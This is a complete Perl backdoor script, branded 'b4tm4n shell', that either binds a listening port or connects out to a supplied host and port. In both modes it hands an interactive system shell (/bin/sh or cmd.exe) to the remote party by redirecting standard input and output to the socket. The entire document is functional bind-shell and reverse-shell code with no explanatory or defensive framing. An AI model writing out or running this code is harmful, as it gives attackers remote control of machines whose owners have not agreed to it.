#!/usr/bin/env perl
use IO::Socket;
$os=$^O;
$sh="export TERM=xterm;PS1='\$PWD\>';export PS1;/bin/sh -i";
if($os=~m/win/i){$sh="%COMSPEC% /K";}
$t=getprotobyname('tcp');
socket(S,&PF_INET,&SOCK_STREAM,$t)||die();
if(@ARGV==1){
	$p=$ARGV[0];
	setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
	bind(S,sockaddr_in($p,INADDR_ANY))||die();
	listen(S,3)||die();
	accept(C,S);
	send(C,"b4tm4n shell : connected\n",0);
	open STDIN,"<&C";open STDOUT,">&C";open STDERR,">&C";
	exec $sh||die();
	close(C);close(S);close(STDIN);close(STDOUT);close(STDERR);
	exit 0;
}
elsif(@ARGV==2){
	$p=$ARGV[0];
	$h=$ARGV[1];
	$i=inet_aton($h)||die();
	$a=sockaddr_in($p,$i)||die();
	connect(S,$a)||die();
	send(S,"b4tm4n shell : connected\n",0);
	open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
	exec $sh||die();
	close(S);close(STDIN);close(STDOUT);close(STDERR);
}
else{exit(1);}